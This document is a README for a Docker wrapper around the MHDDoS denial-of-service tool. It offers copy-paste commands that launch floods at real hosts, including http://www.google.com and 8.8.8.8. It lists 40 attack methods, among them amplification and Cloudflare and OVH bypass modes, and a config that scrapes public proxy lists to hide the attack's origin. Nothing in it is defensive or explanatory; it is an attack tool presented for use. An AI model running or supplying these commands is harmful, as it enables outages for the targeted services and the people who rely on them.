# MHDDoS docker

-----------------

This is docker wrapper for https://github.com/MHProDev/MHDDoS

## Running

Proxy list example

```text
46.191.239.183:8080
user:password@46.191.239.183:8080
91.221.17.220:8000
user:password@91.221.17.220:8000
user:password@proxy.com:8000
proxy.com:8000

```

### Default

```shell
$ # Help (ignore `python3 start.py` in help text)
$ docker run --rm -it sergak01/mhddos

$ docker run --rm -it sergak01/mhddos GET http://www.google.com 1 1000 /proxy.txt 70 60
```

### With proxy volume
```shell
$ docker run --rm -it -v /absolute-path/proxy-list.txt:/proxy.txt sergak01/mhddos

$ docker run -ti --rm -v /absolute-path/proxy-list.txt:/proxy.txt sergak01/mhddos GET http://www.google.com 1 1000 /proxy.txt 70 60
```

## Docs

> Note: If the Proxy list is empty, the attack will run without proxies
> If the Proxy file doesn't exist, the script will download proxies and check them.
> Proxy Type **0** = All in config.json

### config.json from original repo

> Note: You can replace this config by when docker start by add additional volume
> ```text
> docker run -ti --rm -v /absolute-path/config.json:/home/MHDDoS/config.json sergak01/mhddos
> ```
> MHDDoS automatically load proxy list by type selected in command when `proxy.txt` file is not exist

```json
{
  "proxy-providers": [
    {"type":4, "url": "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4", "timeout": 5}, 
    {"type":4, "url": "https://www.proxy-list.download/api/v1/get?type=socks4", "timeout": 5}, 
    {"type":4, "url": "https://www.proxyscan.io/download?type=socks4", "timeout": 5}, 
    {"type":4, "url": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", "timeout": 5}, 
    {"type":5, "url": "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5", "timeout": 5}, 
    {"type":5, "url": "https://www.proxy-list.download/api/v1/get?type=socks5", "timeout": 5},
    {"type":5, "url": "https://www.proxyscan.io/download?type=socks5", "timeout": 5},
    {"type":5, "url": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", "timeout": 5},
    {"type":1, "url": "https://api.proxyscrape.com/?request=displayproxies&proxytype=http", "timeout": 5},
    {"type":1, "url": "https://www.proxy-list.download/api/v1/get?type=http", "timeout": 5},
    {"type":1, "url": "https://www.proxyscan.io/download?type=http", "timeout": 5},
    {"type":1, "url": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "timeout": 5},
    {"type":1, "url": "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", "timeout": 5}
  ]
}
```

#### Proxy types

| Value |  Type  |
|:-----:|:------:|
| **4** | Socks4 |
| **5** | Socks5 |
| **1** |  HTTP  |

Layer7: docker run --rm -it sergak01/mhddos <method> <url> <socks_type5.4.1> <threads> <proxylist> <rpc> <duration>
Layer4: docker run --rm -it sergak01/mhddos <method> <ip:port> <threads> <duration> <reflector file, (only use with Amplification)>

> Methods:
> - Layer4
>  | UDP, SYN, VSE, MEM, CHAR, NTP, DNS, ARD, TCP, MINECRAFT, RDP | 11 Methods
> - Layer7
>  | APACHE, GET, DGB, DYN, BOT, POST, COOKIE, OVH, XMLRPC, STRESS, AVB, PPS, CFBUAM, NULL, SLOW, EVEN, BYPASS, HEAD, GSB, CFB | 20 Methods
> - Tools
>  | PING, DSTAT, INFO, CHECK, CFIP, DNS | 6 Methods
> - Others
>  | TOOLS, HELP, STOP | 3 Methods
> - All 40 Methods

More info: https://github.com/MHProDev/MHDDoS

Example:
```shell
$ # Layer7
$ docker run --rm -it sergak01/mhddos SLOW https://example.com 5 884 proxy.txt 70 1747
$
$ # Layer4:
$ docker run --rm -it sergak01/mhddos TCP 8.8.8.8:80 989 2560
```
